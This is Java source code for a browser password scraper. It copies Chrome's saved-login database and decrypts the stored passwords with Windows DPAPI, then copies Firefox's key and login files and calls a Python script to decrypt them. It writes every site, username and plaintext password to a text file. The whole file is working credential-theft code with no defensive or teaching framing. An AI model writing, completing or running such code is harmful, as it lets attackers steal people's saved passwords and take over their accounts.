// Password Scraper for Chrome/Firefox/IE for Windows/Linux/Mac
import java.util.*;

// Apache Libs
import org.apache.commons.io.FileUtils;

// WIN32 Native Functions
import com.sun.jna.platform.win32.*;

import java.io.BufferedReader;
// Standard Java IO
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.PrintStream;

// SQLite libraries
import java.sql.DriverManager;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

// Libraries for Handling JSON
import org.json.JSONArray;
import org.json.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

// Java Sec Suite
import java.security.*;

public class jdec extends Crypt32Util {
	
	public static void ChromeDec() throws IOException, SQLException {
		
		// Get username
		String user = System.getProperty("user.name");
		
		// Chrome
		File chrome = FileUtils.getFile("C:/Users/" + user + "/AppData/Local/Google/Chrome/User Data/Default/Login Data");
		File chromedest = FileUtils.getFile("logindata.db");
		FileUtils.copyFile(chrome, chromedest);
	
		Connection conn = null;

		// Use arguments string for db url
		String url = "jdbc:sqlite:logindata.db";
		conn = DriverManager.getConnection(url);

		// SQL Queries
		Statement stmt1 = conn.createStatement();
		Statement stmt2 = conn.createStatement();
		Statement stmt3 = conn.createStatement();
		Statement stmt4 = conn.createStatement();
		String sqlurls = "SELECT origin_url FROM logins ";
		String sqlusernames = "SELECT username_value FROM logins ORDER BY username_value";
		String sqlpassblobs = "SELECT password_value FROM logins ORDER BY username_value";
		String count = "SELECT COUNT(username_value) FROM logins";
		ResultSet dbcount = stmt4.executeQuery(count);
		int cint = dbcount.getInt(1);
	
		ArrayList<byte[]> bytearray = new ArrayList<byte[]>();
	
		ResultSet rsurls = stmt1.executeQuery(sqlurls);
		ResultSet rsusernames = stmt2.executeQuery(sqlusernames);
		ResultSet rspassblobs = stmt3.executeQuery(sqlpassblobs);
	
		// URLs into String array
		int urint = 0;
		String[] urls = new String[cint];
		while(urint!=cint){
		urls[urint] = rsurls.getString(1);
		rsurls.next();
		urint++;
		}
	
		// Usernames into String array
		int unint = 0;
		String[] usernames = new String[cint];
		while(unint!=cint) {
		usernames[unint] = rsusernames.getString(1);
		rsusernames.next();
		unint++;
		}
	
		int pint = 0;
		// Putting BLOBs into byte array
		while(pint!=cint) {
		bytearray.add(rspassblobs.getBytes(1));
		rspassblobs.next();
		pint++;
		}
	
		ArrayList<byte[]> unencrypted = new ArrayList<byte[]>();
		int x = 0;
	
		// Decrypt data
		while(x != cint) {
			unencrypted.add(cryptUnprotectData(bytearray.get(x), 0));
			x++;
		}
	
		// Put decrypted passwords into string array
		String[] passwords = new String[cint];
		for(int y = 0; y < cint; y++) {
			passwords[y] = new String(unencrypted.get(y), "UTF-8");
		}
	
		// Print results
		for(int i = 0; i < cint; i++) {
		System.out.println(urls[i] + " -- " + usernames[i] + " -- " + passwords[i]);
		}
	}
	
	public static void FirefoxDec() throws IOException, ParseException, GeneralSecurityException {
		
		// Get username
		String user = System.getProperty("user.name");

		// Firefox -- Uses a decryption key in the Mozilla folder which we need to use, password file is in JSON format
		File firefoxloc = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles");
		String[] fuckfirefox = firefoxloc.list();
		String userloc = new String();
	
		// Search for profile default login, potentially other usernames but most people will use default Firefox profile
		for(String directory : fuckfirefox){
			if(directory.contains(".default")){
				userloc = directory;
			}
		}
	
		// Get Key File
		File firefox = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "/key3.db");
		File firefoxkeydest = FileUtils.getFile("key3.db");
		File firefoxkeydest2 = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/key3.db");
		FileUtils.copyFile(firefox, firefoxkeydest);
		FileUtils.copyFile(firefox, firefoxkeydest2);
		
		// Move secmod file for convenience
		File secmodloc = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "/secmod.db");
		File secmoddest = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/secmod.db");
		FileUtils.copyFile(secmodloc, secmoddest);
		
		// Get JSON file, hashes in plaintext
		File firefoxjson = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "/logins.json");
		File firefoxjdest = FileUtils.getFile("logins.json");
		FileUtils.copyFile(firefoxjson, firefoxjdest);
		
		// Parse
		JSONParser parser = new JSONParser();
		Object jffobj = parser.parse(new FileReader("logins.json"));
		String ffdata = jffobj.toString();
		JSONObject ffobj = new JSONObject(ffdata);
		JSONArray logins = ffobj.getJSONArray("logins");
		
		// Put into arrays
		
		// URLS
		ArrayList<String> ffurls = new ArrayList<String>();
		// Encrypted Usernames + Passwords
		ArrayList<String> ffencryptedusernames = new ArrayList<String>();
		ArrayList<String> ffencryptedpasswords = new ArrayList<String>();
		// Decrypted Usernames + Passwords
		ArrayList<String> ffdecryptedusernames = new ArrayList<String>();
		ArrayList<String> ffdecryptedpasswords = new ArrayList<String>();
		
		// Get websites
		for(int j = 0; j < logins.length(); j++){
			ffurls.add(logins.getJSONObject(j).getString("hostname"));
			System.out.println("URL: " + logins.getJSONObject(j).getString("hostname"));
		}
		
		// Get encrypted usernames
		for(int j = 0; j < logins.length(); j++){
			ffencryptedusernames.add(logins.getJSONObject(j).getString("encryptedUsername"));
		}
		
		// Get encrypted passwords
		for(int j = 0; j < logins.length(); j++){
			ffencryptedpasswords.add(logins.getJSONObject(j).getString("encryptedPassword"));
		}
		
		System.out.println("Firefox usernames and passwords: ");
		
		// Execute Python script -- lucky for us this needs very little configuration
		try{
		ProcessBuilder pb = new ProcessBuilder(System.getProperty("user.dir").toString() + "\\Python27\\python", "firefox_decrypt.py", "-n");
		pb.directory(new File(System.getProperty("user.dir") + "\\Python27\\"));
		Process p = pb.start();
		
		BufferedReader output = getOutput(p);
		BufferedReader error = getError(p);
		String ligne = "";

		while ((ligne = output.readLine()) != null) {
		    System.out.println(ligne);
		}

		while ((ligne = error.readLine()) != null) {
		 System.out.println(ligne);
		}
		
		p.waitFor();
		
		}catch(Exception e){System.out.println(e);}
		
	}
	
	private static BufferedReader getOutput(Process p) {
	    return new BufferedReader(new InputStreamReader(p.getInputStream()));
	}

	private static BufferedReader getError(Process p) {
	    return new BufferedReader(new InputStreamReader(p.getErrorStream()));
	}
	
	
	public static void main(String[] args) throws SQLException, IOException, ParseException, GeneralSecurityException {
		
		// Redirect output to text file
		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
		System.setOut(out);
		
		ChromeDec();
		FirefoxDec();
		System.out.println("Done");
	}
}
